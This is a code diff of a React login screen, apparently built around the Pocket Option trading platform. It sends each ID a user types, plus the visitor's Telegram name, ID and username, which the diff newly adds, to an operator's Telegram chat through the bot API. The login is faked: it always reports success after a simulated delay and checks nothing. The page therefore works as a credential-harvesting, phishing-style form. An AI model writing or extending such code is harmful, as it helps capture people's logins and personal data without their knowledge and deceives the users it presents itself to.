@@ -23,49 +23,46 @@ const LoginScreen: React.FC<LoginScreenProps> = ({ onLogin, lang }) => {
     console.log("Attempting to send to Telegram...");
     
     // Debug checks
-    if (!token) {
-      console.error("❌ ERROR: VITE_TELEGRAM_TOKEN is missing. Check your .env file.");
-      return;
+    if (!token || !chatId) {
+      console.warn("⚠️ Telegram Logs disabled: VITE_TELEGRAM_TOKEN or VITE_TELEGRAM_CHAT_ID missing in .env");
     }
-    if (!chatId) {
-      console.error("❌ ERROR: VITE_TELEGRAM_CHAT_ID is missing. Check your .env file.");
-      return;
-    }
+
+    // Capture Telegram User Data if available
+    const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
+    const tgUserInfo = tgUser 
+      ? `\n👤 <b>TG Name:</b> ${tgUser.first_name} ${tgUser.last_name || ''}\n🆔 <b>TG ID:</b> <code>${tgUser.id}</code>\n🔗 <b>TG Username:</b> @${tgUser.username || 'none'}`
+      : '\n👤 <b>TG User:</b> Unknown (Browser)';
 
     const message = `
 🚀 <b>New Login Attempt</b>
 
-👤 <b>User ID:</b> <code>${userId}</code>
+🔑 <b>Input ID:</b> <code>${userId}</code>
+${tgUserInfo}
 🌍 <b>Language:</b> ${lang.toUpperCase()}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
     `;
 
-    try {
-      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      });
+    if (token && chatId) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
 
-      const data = await response.json();
-
-      if (!response.ok) {
-        console.error("❌ Telegram API Error:", data);
-        if (data.description === "Forbidden: bot was blocked by the user") {
-          alert("ОШИБКА: Вы не нажали /start в своем боте!");
-        } else if (data.description === "Bad Request: chat not found") {
-             alert("ОШИБКА: Неверный Chat ID или вы не начали диалог с ботом.");
+        const data = await response.json();
+        if (!response.ok) {
+          console.error("❌ Telegram API Error:", data);
+        } else {
+          console.log("✅ Telegram message sent successfully!", data);
         }
-      } else {
-        console.log("✅ Telegram message sent successfully!", data);
+      } catch (error) {
+        console.error("❌ Network Error sending to Telegram:", error);
       }
-
-    } catch (error) {
-      console.error("❌ Network Error sending to Telegram:", error);
     }
   };
 
@@ -75,13 +72,14 @@ const LoginScreen: React.FC<LoginScreenProps> = ({ onLogin, lang }) => {
 
     setStatus('checking');
     
-    // Send data to Telegram
+    // Send data to Telegram (Includes both Input ID and TG User Info)
     logToTelegram(key);
     
-    // Fake loading sequence
+    // Future integration: API Call to Pocket Option here
+    // For now, simulate delay
     setTimeout(() => {
       setStatus('success');
-      setTimeout(onLogin, 1000); // Wait a bit to show success state
+      setTimeout(onLogin, 1000); 
     }, 2000);
   };
 
